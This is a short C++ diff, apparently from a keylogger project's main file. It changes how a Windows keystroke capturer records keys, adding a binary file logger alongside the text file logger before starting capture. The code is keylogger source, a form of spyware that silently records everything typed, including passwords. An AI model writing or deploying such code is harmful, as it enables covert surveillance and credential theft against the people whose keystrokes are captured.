@@ -8,12 +8,17 @@
 int main() {
     Keylogger::KeycodeMapperUS mapper;
 
+    Keylogger::FileLogger loggerBin;
+    loggerBin.open(nullptr, "test.bin");
+
     Keylogger::FileLogger logger;
-    logger.open(mapper, "test.txt");
+    logger.open(&mapper, "test.txt");
 
     Keylogger::KeystrokeCapturerWindows capturer;
 
-    capturer.setLogger(&logger);
+    capturer.addLogger(&loggerBin);
+    capturer.addLogger(&logger);
+
     capturer.start();
     capturer.consumeKeystrokes(false);
 
